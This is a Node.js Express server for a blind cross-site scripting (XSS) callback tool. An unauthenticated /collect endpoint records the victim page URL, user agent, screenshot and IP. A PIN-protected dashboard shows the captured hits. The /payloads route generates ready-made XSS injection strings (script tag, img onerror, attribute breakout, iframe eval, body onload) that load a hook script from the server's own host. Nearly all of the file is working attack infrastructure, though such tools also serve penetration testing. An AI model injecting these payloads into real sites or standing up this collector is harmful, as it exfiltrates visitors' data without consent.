const express = require('express');
const cors = require('cors');
const path = require('path');
const session = require('express-session');
const db = require('./db');

require('dotenv').config();

const app = express();
const PIN = process.env.BLINDXSS_PIN;

if (!PIN) {
  console.error('Error: BLINDXSS_PIN not set in environment variables');
  process.exit(1);
}

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Session setup
app.use(session({
  secret: process.env.SESSION_SECRET, // change to your own secret in production
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false } // set to true if using HTTPS
}));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use('/js', express.static(path.join(__dirname, 'public/js')));

// Middleware to protect routes
function checkPin(req, res, next) {
  if (req.session && req.session.authenticated) {
    return next();
  } else {
    return res.redirect('/login');
  }
}

// Login page
app.get('/login', (req, res) => {
  res.render('login', { error: null });
});

// Login handler
app.post('/login', (req, res) => {
  const userPin = req.body.pin;
  if (userPin === PIN) {
    req.session.authenticated = true;
    res.redirect('/dashboard'); // redirect to dashboard after login
  } else {
    res.render('login', { error: 'Incorrect PIN' });
  }
});

// Logout route (optional)
app.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/login');
  });
});

// Payload receiver (no auth, since it's used by payloads)
app.post('/collect', (req, res) => {
  const { url, userAgent, ua, screenshot } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const time = new Date().toISOString();

  db.run(
    `INSERT INTO payloads (url, userAgent, screenshot, ip, time) VALUES (?, ?, ?, ?, ?)`,
    [url, userAgent || ua, screenshot || null, ip, time || null]
  );

  res.sendStatus(200);
});

// Protected routes
app.get('/dashboard', checkPin, (req, res) => {
  db.all('SELECT * FROM payloads ORDER BY id DESC', [], (err, rows) => {
    if (err) {
      return res.status(500).send('Database error');
    }
    res.render('dashboard', { payloads: rows });
  });
});

app.get('/payloads', checkPin, (req, res) => {
  const host = req.headers.host; // e.g. localhost:4000
  const payloadBase = `<script src="http://${host}/js/hook2.js"></script>`;

  const payloads = [
    payloadBase,
    `<img src=x onerror="${payloadBase}">`,
    `"><script src="http://${host}/js/hook2.js"></script>`,
    `<iframe src="javascript:eval('<script src=\\'http://${host}/js/hook2.js\\'><\\/script>')">`,
    `<body onload="${payloadBase}">`
  ];

  res.render('payloads', { payloads });
});

app.get('/about', checkPin, (req, res) => {
  res.render('about');
});

app.get('/notifications', checkPin, (req, res) => {
  res.render('notifications');
});

const PORT = 4000;
app.listen(PORT, () => console.log(`Listening on http://localhost:${PORT}/dashboard`));
